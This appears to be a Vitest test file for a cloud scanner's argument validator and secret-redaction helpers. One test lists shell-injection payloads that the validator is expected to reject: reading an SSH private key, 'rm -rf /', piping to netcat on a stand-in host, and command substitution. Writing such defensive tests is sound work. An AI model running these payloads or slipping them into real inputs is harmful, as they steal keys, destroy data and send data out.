import { describe, it, expect } from 'vitest';
import {
  assertSafeScanArg,
  redactSecrets,
  redactValue,
  SCAN_ARG_PATTERNS,
} from '../src/tools.js';

describe('assertSafeScanArg', () => {
  it('accepts well-formed values', () => {
    expect(assertSafeScanArg('k8s-namespace', 'kube-system')).toBe('kube-system');
    expect(assertSafeScanArg('aws-region', 'eu-central-1')).toBe('eu-central-1');
    expect(assertSafeScanArg('aws-profile', 'prod.account-1')).toBe('prod.account-1');
    expect(assertSafeScanArg('gcp-project', 'my-project-123')).toBe('my-project-123');
    expect(assertSafeScanArg('gcp-project', 'example.com:my-project')).toBe('example.com:my-project');
    expect(assertSafeScanArg('azure-subscription', '00000000-0000-0000-0000-000000000000')).toBe(
      '00000000-0000-0000-0000-000000000000',
    );
    expect(assertSafeScanArg('azure-resource-group', 'rg_prod-1.(eu)')).toBe('rg_prod-1.(eu)');
  });

  it('rejects shell-injection payloads for every scan-arg kind', () => {
    const payloads = [
      'x; cat ~/.ssh/id_rsa',
      'x && rm -rf /',
      'x | nc evil 1',
      'x`whoami`',
      'x$(id)',
      'x\nwhoami',
      "x' '",
      'x y',
    ];
    for (const kind of Object.keys(SCAN_ARG_PATTERNS) as (keyof typeof SCAN_ARG_PATTERNS)[]) {
      for (const p of payloads) {
        expect(() => assertSafeScanArg(kind, p)).toThrow(/not allowed/i);
      }
    }
  });
});

describe('redactSecrets', () => {
  it('strips user:password@ from DSNs while keeping host info', () => {
    expect(redactSecrets('postgres://user:s3cr3t@db.internal:5432/app')).toBe(
      'postgres://user:***@db.internal:5432/app',
    );
    expect(redactSecrets('mongodb://admin:pw@mongo:27017')).toBe('mongodb://admin:***@mongo:27017');
  });

  it('leaves credential-free strings untouched', () => {
    expect(redactSecrets('https://example.com/path')).toBe('https://example.com/path');
    expect(redactSecrets('just a note')).toBe('just a note');
  });
});

describe('redactValue', () => {
  it('recursively redacts secrets in nested metadata', () => {
    const input = {
      dsn: 'postgres://u:p@h:5432/db',
      nested: { url: 'redis://user:pass@cache:6379', count: 3 },
      list: ['mysql://root:toor@mysql', 'plain'],
      n: 42,
    };
    expect(redactValue(input)).toEqual({
      dsn: 'postgres://u:***@h:5432/db',
      nested: { url: 'redis://user:***@cache:6379', count: 3 },
      list: ['mysql://root:***@mysql', 'plain'],
      n: 42,
    });
  });
});
